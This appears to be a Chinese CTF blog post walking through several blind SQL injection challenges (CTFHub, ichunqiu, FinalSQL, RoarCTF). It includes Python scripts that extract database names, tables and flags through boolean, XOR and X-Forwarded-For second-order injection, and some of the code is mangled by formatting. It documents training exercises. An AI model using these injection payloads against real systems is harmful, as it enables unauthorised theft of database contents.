+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge-f97e540ba1090818.sandbox.ctfhub.com:10800/&quot;</span><br><span class="line">dic =&quot;0123456789ABCDEFGHIJKLMNOPQRSTUWVYZabcdefghijklmnopqrstuvwxyz&#123;,&#125;!&quot;</span><br><span class="line">re = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        #payload = &quot;1 and if(substr(database(),%d,1) = &#x27;%c&#x27;,1,0) &quot;%(i,j)</span><br><span class="line">        #payload = &quot;1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1) =&#x27;%c&#x27;,1,0)&quot;%(i,j)</span><br><span class="line">        #payload = &quot;1 and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;),%d,1) = &#x27;%c&#x27;,1,0)&quot;%(i,j)</span><br><span class="line">        #payload = &quot;1&#x27; and if(substr((select group_concat(xxx) from (tablenamexxxx)),%d,1) == %c,1,0)-- &quot;%(i,j)</span><br><span class="line">        prams = &#123;&#x27;id&#x27;:payload&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        r = requests.get(url,prams)</span><br><span class="line">        if &#x27;query_success&#x27; in r.text:</span><br><span class="line">           re += j</span><br><span class="line">           print(re)</span><br><span class="line">           break</span><br><span class="line"></span><br><span class="line">    if j == &#x27;!&#x27;:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-ichunqiu“迎圣诞，拿大奖”活动赛题：post"><a href="#2-ichunqiu“迎圣诞，拿大奖”活动赛题：post" class="headerlink" title="2.ichunqiu“迎圣诞，拿大奖”活动赛题：post"></a>2.ichunqiu“迎圣诞，拿大奖”活动赛题：post</h5><p> sql一般用户名是admin，在做的时候发现用了一些常用的注释方法后发现都是回显username error，说明没办法在username注入但是password又难以爆出，所以可以fuzz看看观察题目特征。但是当我输入%23时发现：</p>
+<p>在网上找到相关文献</p>
+<p><img src="../images/2022-04-10%201-16499374642131.png" alt="2022-04-10 1"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/82156123">(55条消息) 深入解析sprintf格式化字符串漏洞_大方子的博客-CSDN博客_sprintf格式化字符串漏洞</a></p>
+<p>对于sprintf的解释是这样的：如果 % 符号多于 arg 参数，必须使用占位符,占位符位于 % 符号之后，由数字和 “$“ 组成</p>
+<p>没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空，<code>%1$</code>可以逃逸引号的转义，因此我们利用%1$把分号转义出的\吃掉，就可以成功闭合，然后在后面实现注入了。</p>
+<p>%1$会吃掉\的方法来构造注入点：</p>
+<p>先按照文中的方法拿admin%1$&#39; and 1=1#进行尝试</p>
+<p>发现还是不行，换一下连接符and-&gt;or,and被和谐了。</p>
+<p>这里or语句被成功执行了，接下来就是盲注的时间了</p>
+<p>padload：</p>
+<p>但是这里自己学着写的脚本跑的很慢，但是跑还是可以跑出来的：</p>
+<h4 id="bool（慢）"><a href="#bool（慢）" class="headerlink" title="bool（慢）"></a>bool（慢）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#bool</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">dict = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-=&quot;</span><br><span class="line">name = &quot;&quot;</span><br><span class="line">right = &quot;password error!&quot;</span><br><span class="line">worry = &quot;username error!&quot;</span><br><span class="line">url = &#x27;http://eci-2zee88w9kkna202hncnn.cloudeci1.ichunqiu.com/&#x27;</span><br><span class="line"></span><br><span class="line">#求长度</span><br><span class="line">for length in range(30):</span><br><span class="line">     pad1 = &quot;admin%1$&#x27; and (length(database())=&quot; + str(length) + &quot;)#&quot;</span><br><span class="line">     #表名pad1 = &quot;admin%1$&#x27;&quot;+&quot; and (length((select table_name FROM information_schema.tables WHERE table_schema=0x637466 limit 0,1))=&quot; + str(length) + &quot;)#&quot;&quot;</span><br><span class="line">     #列名pad1 = &quot;admin%1$&#x27; and &quot; + &quot;length((select column_name FROM information_schema.columns WHERE table_name=0x666c6167 limit 0,1))=&quot; + str(i) + &quot;#&quot;</span><br><span class="line">     #字段名pad1 =  key = &quot;admin%1$&#x27; and &quot; + &quot;length((select flag FROM flag limit 0,1))=&quot; + str(i) + &quot;#&quot;</span><br><span class="line">     data1 = &#123;&#x27;username&#x27;:pad1,&#x27;password&#x27;:&#x27;111&#x27;&#125;</span><br><span class="line">     r1 = requests.post(url,data=data1).text</span><br><span class="line">     if right in str(r1):</span><br><span class="line">         print(&#x27;the length of database is %s&#x27; %length)</span><br><span class="line">         #print(&#x27;the length of table is %s&#x27; %length)</span><br><span class="line">         #print(&#x27;the length of column is %s&#x27; %length)</span><br><span class="line">         #print(&#x27;the length of content is %s&#x27; %length)</span><br><span class="line"></span><br><span class="line"># #求名字</span><br><span class="line"># for j in range(1,length+1):</span><br><span class="line">#      for i in range(65,123):</span><br><span class="line">#          pad2 = &quot;admin%1$&#x27;&quot;+&quot; and (ascii(substr(database(),%d,1))=%d)#&quot;%(j,i)</span><br><span class="line">#          #表名pad2 = &quot;admin%1$&#x27;&quot;+&quot; and (ascii(substr((select  table_name FROM information_schema.tables WHERE table_schema=0x637466 limit 0,1),%d,1))=%d)#&quot;%(j,i)</span><br><span class="line">#          #列名pad2 = &quot;admin%1$&#x27;&quot;+&quot; and (ascii(substr((select  column_name FROM information_schema.columns WHERE table_name=0x666c6167 limit 0,1),%d,1))=%d)#&quot;%(j,i)</span><br><span class="line">#</span><br><span class="line">#          data2 = &#123;&#x27;username&#x27;: pad2,&#x27;password&#x27;: &#x27;111&#x27;&#125;</span><br><span class="line">#          r2 = requests.post(url, data=data2).text</span><br><span class="line">#          if right in str(r2):</span><br><span class="line">#              name += chr(i)</span><br><span class="line">#              print(name)</span><br><span class="line">#求字段名</span><br><span class="line">for j in range(1, length + 1):</span><br><span class="line">    for i in dict:</span><br><span class="line">        pad2 = &quot;admin%1$&#x27;&quot;+&quot; and (ascii(substr((select flag FROM flag limit 0,1),%d,1))=&quot;%j+str(ord(i))+&quot;)#&quot;#chr()是 ord() 的逆函数,即ord()把字符转换成ascii码值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        data2 = &#123;&#x27;username&#x27;: pad2, &#x27;password&#x27;: &#x27;111&#x27;&#125;</span><br><span class="line">        r2 = requests.post(url, data=data2).text</span><br><span class="line">        if right in str(r2):</span><br><span class="line">            name += i</span><br><span class="line">            print(name)</span><br></pre></td></tr></table></figure>
+
+<p>注：</p>
+<p>脚本可根据注入点，注入方式，waf的不同来套，但是不得不说这个的实在是太慢了，而可以考虑分成两个线程同时进行。</p>
+<p>对于时间盲注的就更慢了，所以接下来要做二分法的</p>
+<p> 这题里面</p>
+<p>#十六进制为了解决引号会被转义的问题，key里面不允许用$时可用拼接的方法,limit 0,1表示的是从第一条记录开始，只取一条即可</p>
+<p>#chr()是 ord() 的逆函数,即ord()把字符转换成ascii码值</p>
+<p>sqlmap的方法可以参考这位大佬的：</p>
+<p>[(56条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37921080/article/details/79764911?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3.pc_relevant_antiscanv2&utm_relevant_index=4">迎圣诞，拿大奖] Sqli writeup_Flyour的博客-CSDN博客</a></p>
+<h5 id="3-极客大挑战-2019-FinalSQL"><a href="#3-极客大挑战-2019-FinalSQL" class="headerlink" title="3.[极客大挑战 2019]FinalSQL"></a>3.[极客大挑战 2019]FinalSQL</h5><p>这个题目上学期就做过，现在主要学fuzz的绕过和一些做题思路。</p>
+<p>观察题目看到标志性的id,然后如果输入没有的id会爆出error的错误，所以我们用fuzz来查看过滤的情况。用的时候只能用小线程的，不然会429。脚本有时候会跑不出来，所以最好用bp。</p>
+<p>点击上面的方框可以得到不同的id：观察发现error就是错误，‘’你可别被我逮住了，臭弟弟‘’是过滤过的。</p>
+<p>并且可以判断出来为数字型注入，这里的数字型还可以进行一些逻辑和算术运算，所以可以联想到xor这样的绕过方法，然后尽量不要选择时间盲注，这个实在是耗时，我上次用到的方法就是时间盲注。</p>
+<h5 id="的理解（利用）"><a href="#的理解（利用）" class="headerlink" title="^的理解（利用）"></a>^的理解（利用）</h5><p>异或<code>&#39;^&#39;</code>是一种数学运算，1^1=0 0^0=0 1^0=1，可以用来进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>，当两条件相同时（同真同假）结果为假，当两条件不同时（一真一假）结果为真</p>
+<h5 id="二分法："><a href="#二分法：" class="headerlink" title="二分法："></a>二分法：</h5><p>import requests</p>
+<p> url = “<a target="_blank" rel="noopener" href="http://5cb9bdd9-00e4-4fcd-a9b3-872e7fe61aa7.node4.buuoj.cn:81/search.php&quot;">http://5cb9bdd9-00e4-4fcd-a9b3-872e7fe61aa7.node4.buuoj.cn:81/search.php&quot;</a> </p>
+<p>flag = ‘’ </p>
+<p>for i in range(1,300):   </p>
+<p> low = 32   </p>
+<p> high = 127  </p>
+<p>  while low &lt; high:     </p>
+<p>   mid = (low+high)//2        </p>
+<p>中间的语句为真，网页不报错，中间的语句为假，网页报错，根据这个判断       </p>
+<p>查数据库        </p>
+<p>database = “?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1” % (i, mid)        </p>
+<p> 查表 </p>
+<p> tables = “?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=’geek’),%d,1))&gt;%d)^1”%(i,mid)        # 查列</p>
+<p>columns = “?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=’F1naI1y’)),%d,1))&gt;%d)^1”%(i,mid)       </p>
+<p>#查字段</p>
+<p> data = “?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1” % (i, mid)        </p>
+<p>print(chr(mid))        </p>
+<p>根据需要查询的内容改变get中的参数        </p>
+<p>r = requests.get(url=url+data)    </p>
+<p>#或者修改为</p>
+<p>【r=requests.get(url,params=params)</p>
+<p>params={‘id’:’ ‘}</p>
+<p>params[‘id’]= 】</p>
+<p>print(url+database)        </p>
+<p>print(payload1)        </p>
+<p>print(r.raw)        </p>
+<p>if ‘Click’ in r.text:            </p>
+<p>low = mid + 1       </p>
+<p> else:            </p>
+<p>high = mid        </p>
+<p>print(low,mid,high)   </p>
+<p>flag += chr(low)    </p>
+<p>print(flag)</p>
+<p>二分法：</p>
+<ul>
+<li>首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</li>
+<li>如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</li>
+<li>如果某一步数组为空，则表示找不到目标元素。</li>
+</ul>
+<h5 id="多线程写法（快）"><a href="#多线程写法（快）" class="headerlink" title="多线程写法（快）"></a>多线程写法（快）</h5><p>#sql injection v2.py</p>
+<p>-<em>- coding: UTF-8 -</em>-</p>
+<p>import threading<br>import requests<br>import random<br>user_agent = [<br>            “Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5”,<br>            “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3”,<br>            “Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3”,<br>            “Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3”,<br>            “Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3”,<br>            “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3”,<br>            “Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3”,<br>            “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3”<br>]</p>
+<p>class MyThread(threading.Thread):<br>    def <strong>init</strong>(self, func, args):<br>        threading.Thread.<strong>init</strong>(self)<br>        self.func = func<br>        self.args = args<br>    def getresult(self):<br>        return self.res<br>    def run(self):<br>        self.res = self.func(*self.args)</p>
+<p>def payload(i,j):<br>    global url<br>    # sql = “1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1”%(i,j)                                #数据库名字<br>    # sql = “1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=’geek’),%d,1))&gt;%d)^1”%(i,j)           #表名<br>    # sql = “1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=’F1naI1y’)),%d,1))&gt;%d)^1”%(i,j)        #列名<br>    sql = “1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1”%(i,j)<br>    #print(i)<br>    header = {‘User-Agent’: user_agent[random.randint(0,7)]}<br>    data = {“id”:sql}<br>    r = requests.get(url,params=data,headers=header)<br>    #print (r.text)<br>    if “Click” in r.text:<br>        res = 1<br>    else:<br>        res = 0</p>
+<pre><code>return res
+</code></pre>
+<p>def exp(a,i):<br>    lock = threading.Lock()<br>    low = 31<br>    high = 127<br>    lock.acquire()<br>    while low &lt;= high :<br>        mid = (low + high) // 2<br>        o=a+i<br>        #print(o)<br>        res = payload(o,mid)<br>        if res :<br>            low = mid + 1<br>        else :<br>            high = mid - 1<br>    asci = int((low + high + 1)) // 2<br>    if (asci == 127 or asci == 31):<br>        return 0<br>    # print (asci)<br>    return chr(asci)<br>    lock.release()</p>
+<p>def main():<br>    global flag<br>    a=1<br>    f=True<br>    while f:<br>        threads = []<br>        for i in range(8):<br>            t = MyThread(exp, (a,i))<br>            threads.append(t)<br>        for i in range(8):<br>            threads[i].start()<br>        for i in range(8):<br>            threads[i].join()<br>            if threads[i].getresult()==0:<br>                f = False<br>            flag = flag + str(threads[i].getresult())</p>
+<pre><code>    a = a+8
+    print(flag+&quot;\n&quot;)
+</code></pre>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    flag = “”<br>    url = “<a target="_blank" rel="noopener" href="http://1deb2c9a-0a0a-4ca3-b983-d779588217ef.node3.buuoj.cn/search.php&quot;">http://1deb2c9a-0a0a-4ca3-b983-d779588217ef.node3.buuoj.cn/search.php&quot;</a><br>main()</p>
+<h5 id="4-RoarCTF-2019-Online-Proxy：X-Forwarded-For"><a href="#4-RoarCTF-2019-Online-Proxy：X-Forwarded-For" class="headerlink" title="4.[RoarCTF 2019]Online Proxy：X-Forwarded-For"></a>4.[RoarCTF 2019]Online Proxy：X-Forwarded-For</h5><p>这题就是考察xff:</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-04-14%20212620-16499439631842.png" alt="屏幕截图 2022-04-14 212620"></p>
+<p>current ip，last ip让我们想到了xff的伪造，属于<strong>二次注入</strong>：</p>
+<p>先输入 <strong>1’ or ‘1</strong> 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：<strong>111</strong>，而last IP就是1’ or ‘1，此时1’ or ‘1已经写入了数据库 .</p>
+<p>因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。</p>
+<p>那么我们<strong>再传一次111</strong>，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</p>
+<p><strong>即当last和current两者相同时会执行数据库查找，当不同时会写入</strong></p>
+<p>所以我们的思路就是在xff里面注入:这题还必须要把cookie传过去，不然不会回显Last Ip</p>
+<p>#这个缩进对齐管得超级严。。。<br>#headers要用post,因为post输入内容。在cookie注入和xff伪造里会用到<br>#一开始不太清楚为什么要加两次的or，应该因为要闭合，原理同1’or’1。<br>import requests<br>import time</p>
+<p>url=”<a target="_blank" rel="noopener" href="http://node4.buuoj.cn:28711/&quot;">http://node4.buuoj.cn:28711/&quot;</a><br>head={<br>    “Cookie”: “track_uuid=c1e2083a-861f-4f74-d6f2-2fb3baa02498”,<br>    “X-Forwarded-For” : “”}</p>
+<p>#headers要用post,因为post输入内容。在cookie注入和xff伪造里会用到<br>flag=””</p>
+<p>for i in range(1,100):<br>    low = 32<br>    high = 128<br>    mid = (low+high)&gt;&gt;1<br>    while low&lt;high:</p>
+<p>head[“X-Forwarded-For”]=”0’ or ascii(substr((select group_concat(schema_name) from information_schema.schemata),{0},1))&gt;{1} or ‘0”.format(i,mid)</p>
+<p>head[“X-Forwarded-For”]=”0’ or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’F4l9_D4t4B45e’),{0},1))&gt;{1} or ‘0”.format(i,mid)</p>
+<p>head[“X-Forwarded-For”] = “0’ or ascii(substr((select group_concat(column_name)from information_schema.columns where table_name= ‘F4l9_t4b1e’ ), {0}, 1)) &gt; {1} or ‘0”.format(i, mid)</p>
+<p> head[“X-Forwarded-For”] = “0’ or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e ), {0}, 1)) &gt; {1} or ‘0”.format(i, mid)</p>
+<p>​    r=requests.post(url=url,headers=head)<br>​        time.sleep(0.01)<br>​    </p>
+<p>​    head[“X-Forwarded-For”]=”111”<br>​        r=requests.post(url=url,headers=head)<br>​    </p>
+<p>​    head[“X-Forwarded-For”]=”111”<br>​        r=requests.post(url=url,headers=head)</p>
+<p>​     if “Last Ip: 1” in r.text:<br>​             low = mid+1<br>​        else:<br>​             high = mid<br>​        mid=(low+high)&gt;&gt;1<br>​    if(mid==32 or mid==127):<br>​        break<br>​    flag+=chr(mid)<br>​    print (flag)<br>print(flag)</p>
+<h5 id="5-考核"><a href="#5-考核" class="headerlink" title="5.考核"></a>5.考核</h5><p>二分法贴一下wp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def SQLinject():</span><br><span class="line">    # url是随时更新的，具体的以做题时候的为准</span><br><span class="line">    url = &#x27;http://eci-2ze4038copm7es1tfa1m.cloudeci1.ichunqiu.com/&#x27;</span><br><span class="line">    # url = &#x27;http://www.sql.com/login.php&#x27;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">#具体情况而定   </span><br><span class="line">   data = &#123;&quot;name&quot;: &quot;&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;123&quot;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    i = 1</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # 从可打印字符开始</span><br><span class="line">        begin = 32</span><br><span class="line">        end = 126</span><br><span class="line">        mid = (begin + end) // 2</span><br><span class="line">        while begin &lt; end:</span><br><span class="line">            # print(begin, mid, end)</span><br><span class="line">    </span><br><span class="line">#根据具体情况而定    </span><br><span class="line">    data[&quot;name&quot;] = &quot;admin%1$&#x27;&quot;+&quot; and (ascii(substr((select flag FROM flag limit 0,1),%d,1))=&quot;%i+str(ord(mid))+&quot;)#&quot;</span><br><span class="line">            # data[&quot;name&quot;] = &quot;admin&#x27; anandd iiff((ascii(substr((Select group_concat(column_name) from infoorrmation_schema.columns Where table_name=&#x27;admin&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),1,0) anandd &#x27;1&quot;.format(i, mid)</span><br><span class="line">            #data[&quot;name&quot;] = &quot;admin&#x27;/**/anandd/**/iiff((ascii(substr((Select/**/group_concat(USER,&#x27;:&#x27;,PASSWOORRD)/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;),1,0)/**/anandd/**/&#x27;1&quot;.format(i, mid)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # time_start = time.time()</span><br><span class="line">    #根据具体情况而定</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            # time_end = time.time()</span><br><span class="line">            # all_time = time_end - time_start</span><br><span class="line">            # print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if &quot;password error!&quot; in r.text:</span><br><span class="line">                # print(111)</span><br><span class="line">                end = mid</span><br><span class="line">                tmp = (begin + end) // 2</span><br><span class="line">                mid = tmp</span><br><span class="line">            else:</span><br><span class="line">                begin = mid + 1</span><br><span class="line">                tmp = (begin + end) // 2</span><br><span class="line">                mid = tmp</span><br><span class="line">        # print(mid)</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        i += 1</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    SQLinject()</span><br></pre></td></tr></table></figure>
+
+<p>if <strong>name</strong> == “<strong>main</strong>“:</p>
+<p>一个python文件通常有两种使用方法，第一是作为脚本直接执行，第二是 import 到其他的 python 脚本中被调用（模块重用）执行。</p>
+<p>在 if <strong>name</strong> == ‘main’: 以下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。</p>
+<h3 id="关于padload几点要说明的："><a href="#关于padload几点要说明的：" class="headerlink" title="关于padload几点要说明的："></a>关于padload几点要说明的：</h3><p>padload就是根据注入点的不同而不同，比如在id,就传参，在headers,就传head。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#post方式中有明确的注入点，如果是username或是password这样的可以用键值[]表明，但是如果是get方式的id可以直接接到url后面用拼接即可。但是最好用前者，可以使用性强</span><br><span class="line">    #例如：data = &quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, mid)</span><br><span class="line">    #r = requests.get(url=url+data)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解决一些编码问题：</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&quot;utf-8&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后要是嫌弃速度太慢还可以用多线程：这个还打不出来，所以就先贴一个脚本改改，见上文</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后根据原理来构造padload,所以主要是找到绕过方法。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hz</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/04/06/sql%E7%9B%B2%E6%B3%A8%E9%A2%98/">http://example.com/2022/04/06/sql%E7%9B%B2%E6%B3%A8%E9%A2%98/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">hz</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/sqli%E7%9B%B2%E6%B3%A8/">
+                                    <span class="chip bg-color">sqli盲注</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
